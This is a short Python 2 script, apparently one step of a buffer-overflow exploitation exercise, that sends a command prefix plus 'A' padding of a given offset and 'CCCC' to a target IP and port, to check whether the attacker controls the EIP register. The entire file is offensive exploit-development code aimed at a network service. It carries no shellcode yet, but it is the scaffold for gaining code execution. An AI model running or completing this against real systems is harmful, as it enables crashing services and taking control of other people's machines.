#!/usr/bin/python
import os, sys, socket, argparse

parser = argparse.ArgumentParser()
parser.add_argument("--h", help="this is the target IP Address")
parser.add_argument("--p", type=int, help="This is the target Port Number")
parser.add_argument("--cmd", type=str, help="This is the command to be eexcuted")
parser.add_argument("--offset", type=int, help="offset byte number as determined at previous step")
#parser.add_argument("--a", type=str, help="pass in 4 bytes to test control we have of eip")
args = parser.parse_args()

RHOST = args.h
RPORT = args.p
cmd = args.cmd

#comment or comment out depending on if you want to run this and test pointer address 
#ptr_address = ""

offset = args.offset
buf = "A"*offset
#if eip control is successful, we will see '43434343' in the eip register
buf += "CCCC"
#print buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((RHOST, RPORT))
s.send((cmd + buf + '\n' ))
print s.recv(1024)
s.close()

